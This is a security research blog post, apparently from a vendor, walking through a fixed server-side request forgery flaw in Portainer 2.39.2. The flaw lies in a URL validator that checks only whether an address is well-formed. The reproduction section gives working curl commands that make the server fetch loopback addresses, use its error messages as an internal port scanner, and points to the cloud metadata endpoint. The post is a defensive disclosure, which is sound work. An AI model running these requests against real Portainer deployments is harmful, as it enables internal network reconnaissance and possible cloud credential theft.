---
title: "Portainer SSRF (GHSA-wqqf-pwjh-2hm6): A Command-by-Command Walkthrough"
slug: "portainer-ssrf-ghsa-wqqf-pwjh-2hm6"
date: "2026-10-14"
author: "Shahid Parvez Hakim"
authorTitle: "Founder & CEO, BugB Technologies"
excerpt: "One URL helper that checked an address was well-formed but never where it led let a signed-in user make Portainer's server fetch internal addresses. Here is exactly how Bravos found and proved it, command by command."
category: "research"
image: "https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-ssrf/cover.png"
---

# Portainer SSRF (GHSA-wqqf-pwjh-2hm6)

**Advisory:** [GHSA-wqqf-pwjh-2hm6](https://github.com/portainer/portainer/security/advisories/GHSA-wqqf-pwjh-2hm6) · **Severity:** Medium, CVSS 5.3 · **Fixed in:** Portainer 2.45.1

Several Portainer features fetch something from a web address the user supplies — a Git repository, a Helm chart repository, a registry to "ping". Portainer checked that the address was **well-formed**. It never checked **where it pointed**. So a signed-in user could make Portainer's own server reach addresses they could not reach themselves — internal services, or a cloud provider's metadata endpoint. This is a server-side request forgery (SSRF).

This post shows, command by command, how a standard user turned those features into an internal-network probe, and how Bravos found and confirmed it.

> Defensive write-up of a fixed flaw. Run it only against a copy of **Portainer 2.39.2** you own and are authorised to test. Upgrade production to 2.45.1 or later.

![Bravos traces every user-supplied URL to one helper, then proves the server fetches an internal address](https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-ssrf/step-preview.png)

## The root cause: one helper that trusts any address

Every one of those features passed the user's URL through the same helper, `IsURL`. GuardLink annotated it in one line during the Bravos run:

> `IsURL` accepts ANY scheme and ANY host: it only requires `url.Parse` to succeed with a non-empty host. No allowlist, no private-IP / link-local / metadata block, no DNS-rebind defense.

When one helper guards every outbound fetch and that helper only checks the *form* of the address, every feature built on it inherits the same SSRF.

## How Bravos found it

1. **GuardLink** read the code and followed each user-supplied URL to where the server dials it. It marked the Git preview, the Helm template fetch, the registry ping, and the OAuth path — and traced them all back to `IsURL`.
2. **CodeGraph** ranked these server-side-fetch routes high, because they reach the network from the server's position.
3. **Cert-X-Gen** proved it on a running copy, as a standard user, by pointing the fetch at an address only the server could reach and watching the server's response leak what happened.

Crucially, Bravos reports SSRF only when the running server actually makes the request — not because the code "looks like" SSRF. Here is the confirmation it recorded.

## Reproduce it, command by command

Authenticate as a standard (non-admin) user. No access to any Docker/Kubernetes environment is required — these are API features, not environment operations:

```bash
# 1. Log in as a standard user
TOKEN=$(curl -s -X POST https://portainer.local/api/auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"<alice-password>"}' | jq -r .jwt)
```

Point the Git repository file-preview feature at a loopback address instead of a real repository. Portainer's server dials it, and the error it returns back to you carries the server-side request path — an internal host/port oracle:

```bash
# 2. Git preview -> server fetches an internal URL (CONFIRMED oracle)
curl -s -X POST "https://portainer.local/api/gitops/repo/file/preview" \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"repository":"http://127.0.0.1:7777/ssrf-probe","targetFile":"README.md"}'
# -> 500. The body contains the server-side go-git request path
#    "/info/refs?service=git-upload-pack" and
#    "dial tcp 127.0.0.1:7777: connect: connection refused".
# That response proves the SERVER made the request, and leaks whether the
# internal port was open or closed. Swap 127.0.0.1:7777 for any internal
# host:port to map what the server can reach.
```

The 500 is the proof: Portainer's server tried to reach `127.0.0.1:7777` on your behalf and told you how it went. A closed port says "connection refused"; an open one responds differently — so this is a working internal port scanner that speaks with the server's network identity.

![The Helm template feature makes the server fetch an attacker-chosen URL and returns its error text](https://e5bnabdufegbkfuq.public.blob.vercel-storage.com/blogs/portainer-ssrf/step-helm.png)

The same gap is reachable through other features — for example the Helm template repository:

```bash
# 3. Helm template fetch -> server requests <attacker-url>/index.yaml
curl -s -G "https://portainer.local/api/templates/helm" \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "repo=http://127.0.0.1:7777/"
# -> 500 whose details field carries Helm's own error text about
#    requesting http://127.0.0.1:7777/index.yaml — again, the server fetched it.
```

Against a cloud deployment, the same technique pointed at `http://169.254.169.254/` reaches the instance metadata service — which is exactly why SSRF that speaks from the server's position is dangerous even at "Medium" severity. How much it exposes depends on the network around Portainer.

## Why the check missed it

The validator answered "is this a valid URL?" — a question about **form**. The question that mattered was "where does this lead, and should the server go there?" — a question about **destination**. A form check passes `http://127.0.0.1:7777` and `http://169.254.169.254` as readily as a real Git host. Cert-X-Gen did not infer this from the code; it sent the request and read the server's own response back, which is how the finding became confirmed rather than suspected.

## The fix and what to do

- **Upgrade to Portainer 2.45.1 or later.**
- **Restrict what the Portainer server can reach:** block its outbound access to `169.254.169.254` and to internal ranges it has no reason to contact. The new destination controls are off by default and, at the time of the advisory, configurable only in Business Edition — so network-level egress filtering is the dependable control.
- The reusable lesson: **validate where an address leads, not whether it parses** — and when one helper guards every outbound fetch, fixing that one helper fixes every feature at once.

## References

- Advisory: [GHSA-wqqf-pwjh-2hm6](https://github.com/portainer/portainer/security/advisories/GHSA-wqqf-pwjh-2hm6)
- Companion case study: [Two Portainer Advisories, found with Bravos](https://bugb.io/resources/case-studies/portainer-ssrf-bindmount)
- GuardLink and Cert-X-Gen are open source; Bravos orchestrates them.
